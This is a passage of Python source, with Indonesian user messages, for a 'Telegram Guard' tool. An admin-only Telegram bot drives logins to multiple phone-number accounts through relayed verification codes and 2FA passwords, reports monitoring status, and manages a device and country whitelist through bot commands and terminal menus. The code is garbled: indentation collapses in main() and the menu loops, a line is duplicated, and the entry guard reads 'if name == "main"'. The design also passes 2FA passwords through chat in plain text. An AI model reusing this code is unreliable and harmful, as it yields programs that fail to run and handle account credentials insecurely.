    @self.bot.message_handler(commands=['status'])
    def handle_status(message):
        if message.chat.id != self.admin_chat_id:
            self.bot.reply_to(message, "Anda tidak memiliki akses ke bot ini.")
            return
        
        status = "✅ Aktif" if self.guard.monitoring else "❌ Tidak aktif"
        active_accounts = len(self.guard.clients)
        
        response = f"Status monitoring: {status}\n"
        response += f"Jumlah akun aktif: {active_accounts}\n\n"
        
        if active_accounts > 0:
            response += "Akun aktif:\n"
            for phone in self.guard.clients.keys():
                age = self.guard.account_manager.get_account_age(phone)
                age_info = f"({age} hari)" if age is not None else ""
                response += f"• {phone} {age_info}\n"
        
        self.bot.send_message(message.chat.id, response)
    
    @self.bot.message_handler(commands=['code'])
    def handle_code(message):
        if message.chat.id != self.admin_chat_id:
            self.bot.reply_to(message, "Anda tidak memiliki akses ke bot ini.")
            return
        
        parts = message.text.split()
        if len(parts) != 3:
            self.bot.reply_to(message, "Format: /code <phone> <verification_code>")
            return
        
        phone = parts[1]
        code = parts[2]
        
        if not phone.startswith('+'):
            phone = f"+{phone}"
        
        # Run verification in the event loop
        def verify_code():
            try:
                success = self.run_in_loop(self.guard.verify_code(phone, code))
                if success:
                    self.bot.reply_to(message, f"Kode verifikasi untuk {phone} berhasil diverifikasi.")
                else:
                    self.bot.reply_to(message, f"Gagal memverifikasi kode untuk {phone}. Silakan coba lagi.")
            except Exception as e:
                self.bot.reply_to(message, f"Error: {str(e)}")
        
        threading.Thread(target=verify_code).start()
    
    @self.bot.message_handler(commands=['password'])
    def handle_password(message):
        if message.chat.id != self.admin_chat_id:
            self.bot.reply_to(message, "Anda tidak memiliki akses ke bot ini.")
            return
        
        parts = message.text.split(maxsplit=2)
        if len(parts) != 3:
            self.bot.reply_to(message, "Format: /password <phone> <2fa_password>")
            return
        
        phone = parts[1]
        password = parts[2]
        
        if not phone.startswith('+'):
            phone = f"+{phone}"
        
        # Run verification in the event loop
        def verify_password():
            try:
                success = self.run_in_loop(self.guard.verify_password(phone, password))
                if success:
                    self.bot.reply_to(message, f"Password 2FA untuk {phone} berhasil diverifikasi. Login selesai.")
                else:
                    self.bot.reply_to(message, f"Gagal memverifikasi password 2FA untuk {phone}. Silakan coba lagi.")
            except Exception as e:
                self.bot.reply_to(message, f"Error: {str(e)}")
        
        threading.Thread(target=verify_password).start()

def process_phone_step(self, message):
    if message.chat.id != self.admin_chat_id:
        self.bot.reply_to(message, "Anda tidak memiliki akses ke bot ini.")
        return
    
    phone = message.text.strip()
    
    if not phone.startswith('+'):
        phone = f"+{phone}"
    
    # Start login process in the event loop
    def start_login():
        try:
            success = self.run_in_loop(self.guard.login_with_phone(phone))
            if success:
                self.bot.reply_to(
                    message,
                    f"Proses login untuk {phone} dimulai. Silakan periksa kode verifikasi."
                )
            else:
                self.bot.reply_to(
                    message,
                    f"Gagal memulai proses login untuk {phone}. Silakan coba lagi."
                )
        except Exception as e:
            self.bot.reply_to(message, f"Error: {str(e)}")
    
    threading.Thread(target=start_login).start()

def process_multi_phone_step(self, message):
    if message.chat.id != self.admin_chat_id:
        self.bot.reply_to(message, "Anda tidak memiliki akses ke bot ini.")
        return
    
    text = message.text.strip()
    
    if text.lower() == 'selesai':
        self.bot.reply_to(message, "Proses login multi akun telah selesai.")
        return
    
    # Split by '+' character but keep the '+' prefix for each number
    phones = []
    pattern = re.compile(r'\+\d+')
    for match in pattern.finditer(text):
        phones.append(match.group())
    
    if not phones:
        self.bot.reply_to(
            message,
            "Format nomor tidak valid. Gunakan format: +62812345678+62823456789\n\n"
            "Coba lagi atau ketik 'selesai' untuk berhenti"
        )
        self.bot.register_next_step_handler(message, self.process_multi_phone_step)
        return
    
    self.bot.reply_to(message, f"Memproses {len(phones)} nomor telepon...")
    
    # Process each phone number
    for phone in phones:
        def start_login(phone):
            try:
                success = self.run_in_loop(self.guard.login_with_phone(phone))
                if success:
                    self.bot.send_message(
                        message.chat.id,
                        f"Proses login untuk {phone} dimulai. Silakan periksa kode verifikasi."
                    )
                else:
                    self.bot.send_message(
                        message.chat.id,
                        f"Gagal memulai proses login untuk {phone}. Silakan coba lagi."
                    )
            except Exception as e:
                self.bot.send_message(message.chat.id, f"Error: {str(e)}")
        
        threading.Thread(target=start_login, args=(phone,)).start()
        time.sleep(2)  # Add delay between requests to avoid flood
    
    # Ask for more numbers
    msg = self.bot.send_message(
        message.chat.id,
        "Masukkan nomor telepon lain atau ketik 'selesai' untuk berhenti"
    )
    self.bot.register_next_step_handler(msg, self.process_multi_phone_step)

def process_whitelist_device_step(self, message):
    if message.chat.id != self.admin_chat_id:
        self.bot.reply_to(message, "Anda tidak memiliki akses ke bot ini.")
        return
    
    device = message.text.strip()
    
    # Store device for next step
    user_data = {"device": device}
    self.bot.send_message(message.chat.id, "Masukkan negara yang diizinkan (contoh: Indonesia):")
    self.bot.register_next_step_handler(message, self.process_whitelist_country_step, user_data)

def process_whitelist_country_step(self, message, user_data):
    if message.chat.id != self.admin_chat_id:
        self.bot.reply_to(message, "Anda tidak memiliki akses ke bot ini.")
        return
    
    country = message.text.strip()
    device = user_data["device"]
    
    self.guard.whitelist_manager.add_device_location(device, country)
    self.bot.reply_to(message, f"Device {device} di {country} telah ditambahkan ke whitelist.")

def run(self):
    """Start the bot in polling mode"""
    logger.info("Starting Telegram Guard Bot...")
    
    # Jalankan event loop dalam thread terpisah
    def run_loop():
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()
        
    thread = threading.Thread(target=run_loop, daemon=True)
    thread.start()
    
    # Mulai bot polling
    self.bot.polling(none_stop=True)
    
    # Saat bot berhenti, hentikan juga event loop
    self.loop.call_soon_threadsafe(self.loop.stop)
async def main():
print("\nTELEGRAM GUARD - MONITORING PERANGKAT")
guard = TelegramGuard()
    guard = TelegramGuard()
    
    try:
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == "--terminal":
        # Run in terminal mode (original behavior)
        await account_management(guard)
        print("\nMemulai monitoring... (Tekan Ctrl+C untuk berhenti)")
        await guard.start()
        
        # Buat task utama tetap berjalan
        while guard.monitoring:
            await asyncio.sleep(1)
    else:
        # Run in bot mode
        print("Memulai Telegram Guard Bot...")
        bot = TelegramGuardBot(guard)
        bot.run()  # Langsung jalankan bot.run()
        
except KeyboardInterrupt:
    await guard.stop()
    print("\nMonitoring dihentikan")
except Exception as e:
    print(f"\nError: {str(e)}")
finally:
    await guard.stop()

# Existing account management functions for terminal mode
async def manage_accounts(guard: TelegramGuard):
while True:
print("\nMenu Kelola Akun:")
print("1. Tambah Akun")
print("2. Lihat Daftar Akun")
print("3. Hapus Akun")
print("4. Kembali ke Menu Utama")
        
            choice = input("Pilih menu (1-4): ")
    
    if choice == "1":
        phone = input("Masukkan nomor telepon (contoh: +628123456789): ").strip()
        password = input("Masukkan password 2FA (kosongkan jika tidak ada): ").strip()
        
        if not phone.startswith('+'):
            print("Nomor telepon harus diawali dengan +")
            continue
            
        guard.account_manager.add_account(phone, password if password else None)
        print(f"\nAkun {phone} berhasil ditambahkan")
    
    elif choice == "2":
        accounts = guard.account_manager.get_accounts()
        sessions = guard.session_manager.get_all_sessions()
        
        print("\nDaftar Akun Terdaftar:")
        for i, acc in enumerate(accounts, 1):
            age = guard.account_manager.get_account_age(acc)
            age_info = f"({age} hari)" if age is not None else ""
            print(f"{i}. {acc} {age_info}")
        
        print("\nDaftar Session Tersedia:")
        for i, session in enumerate(sessions, 1):
            print(f"{i}. {session}")
        
        if not accounts and not sessions:
            print("Tidak ada akun atau session yang terdaftar")
    
    elif choice == "3":
        phone = input("Masukkan nomor telepon yang akan dihapus: ").strip()
        if phone in guard.account_manager.accounts:
            del guard.account_manager.accounts[phone]
            guard.account_manager.save_accounts()
            
            session_name = f"session_{phone}"
            session_path = guard.session_manager.get_session_path(session_name)
            if os.path.exists(session_path):
                os.remove(session_path)
            
            print(f"Akun {phone} berhasil dihapus")
        else:
            print(f"Akun {phone} tidak ditemukan")
    
    elif choice == "4":
        return
    
    else:
        print("Pilihan tidak valid")

async def manage_whitelist(guard: TelegramGuard):
while True:
print("\nMenu Whitelist:")
print("1. Tambah Device & Lokasi Whitelist")
print("2. Lihat Daftar Whitelist")
print("3. Kembali ke Menu Utama")
        
            choice = input("Pilih menu (1-3): ")
    
    if choice == "1":
        device = input("Masukkan model device (contoh: Redmi): ").strip()
        country = input("Masukkan negara yang diizinkan (contoh: Indonesia): ").strip()
        guard.whitelist_manager.add_device_location(device, country)
        print(f"\nDevice {device} di {country} telah ditambahkan ke whitelist")
    
    elif choice == "2":
        print("\nDaftar Whitelist:")
        for device, countries in guard.whitelist_manager.whitelist['device_locations'].items():
            print(f"{device}: {', '.join(countries)}")
        print("\nPerangkat dikenal:")
        for phone, devices in guard.whitelist_manager.whitelist['known_devices'].items():
            print(f"{phone}: {len(devices)} perangkat")
    
    elif choice == "3":
        return
    
    else:
        print("Pilihan tidak valid")

async def account_management(guard: TelegramGuard):
while True:
print("\nMenu Utama:")
print("1. Kelola Akun")
print("2. Kelola Whitelist")
print("3. Mulai Monitoring")
print("4. Keluar")
        
            choice = input("Pilih menu (1-4): ")
    
    if choice == "1":
        await manage_accounts(guard)
    elif choice == "2":
        await manage_whitelist(guard)
    elif choice == "3":
        if not guard.session_manager.get_all_sessions():
            print("\nTidak ada session yang tersedia. Silakan tambah akun terlebih dahulu.")
            continue
        return
    elif choice == "4":
        await guard.stop()
        exit()
    else:
        print("Pilihan tidak valid")

if name == "main":
# Add required imports
import time
    
    try:
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
except KeyboardInterrupt:
    pass
finally:
    loop.close()